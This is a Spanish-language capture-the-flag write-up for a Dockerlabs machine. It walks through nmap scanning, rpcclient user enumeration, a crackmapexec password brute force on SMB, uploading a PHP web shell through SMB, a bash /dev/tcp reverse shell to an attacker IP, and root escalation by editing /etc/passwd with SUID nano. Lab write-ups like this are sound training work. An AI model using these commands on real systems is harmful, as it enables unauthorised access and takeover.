Máquina domain


Iniciamos ocn la rutina de reconocimiento con nmap:

```
# Nmap 7.94SVN scan initiated Thu Apr 18 20:17:52 2024 as: nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn -oN Target 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000050s latency).
Scanned at 2024-04-18 20:17:53 CEST for 17s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-time: 
|   date: 2024-04-18T18:18:06
|_  start_date: N/A
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21783/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58970/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58197/udp): CLEAN (Timeout)
|   Check 4 (port 16713/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Vemos un http,un servicio smb en el puerto 445 y en el 139

Hacemos un reconocimiento de todo, vamos a empezar por el protocolo http que al parecer nos dice que esta corriendo smba, he probado a fuzzeartanto directorios como subdominios y nada, vamos a ver 
los otros servicios el 139 y el 445

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/f46dfba4-e12c-411b-87bb-9d68db0ca333)

Al no tener absolutamente nada de nada, vamos a utilizar la herramienta rpcclient:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/08e4ea79-65b2-4ca9-8fee-011d30ead24a)

encontramos dos usuarios validos james y bob, como no sabemos la contraseña vamos a ver si con crackmapexec podemos ejecutar una fuerza bruta exitosa:

```
crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/a7cca8c9-cbbd-4f31-b195-6f205c9edca5)

La contraseña nos la ha encontrado, asi que vamos a entrar al smb a ver que hay dentro:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/06a6d222-12be-406a-bd0a-91dded953db2)

ya podemos enumerar:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/b288a91f-d4d3-4f3a-8b67-19d08a649930)

Entramos y como podemos ver el html sera el de la página principal, así que si creamos un archivo malicioso y lo metemos en el
smb podemos llamarlo desde la página y entablarnos una reverse shell:

Le voy a meter con el comando put el siguiente archivo llamado cmd.php:

```
<?php
        system($_GET['cmd']);
?>
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/7afc7d38-736c-4e20-a385-19415fc3676c)

ya con ejecución remota de comados, pues vamos a entablarnos la reverse shell:

```
bash -c "bash -i >%26 /dev/tcp/192.168.1.37/443 0>%261"
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/9bf7ae08-9bfc-490b-b541-e5369379c63c)


le metemos el comando: python3 -c 'import pty;pty.spawn("/bin/bash")' y a por el ruteo,

nos metemos en el usuario bob ocn la misma contraseña -> star, sudo -l no funcion, vamos a comprobar los permisos SUID, encontramos que esta nano:

Entonces con nano lo que se puede hacer es:

```
/usr/bin/nano /etc/passwd
```

Si entramos aqui con el nano y le quitamos la x a el usuario root, pues tan solo ponemos su root y nos convertimos en root.

Esta máquina me a parecido interesante por que hacia tiempo que no utilizaba la herramienta rpcclient y ademas nunca habia hecho
una fuerza bruta con crackmapexec a un protocolo smb.

Dificultado 3/5
Diversión 2/5











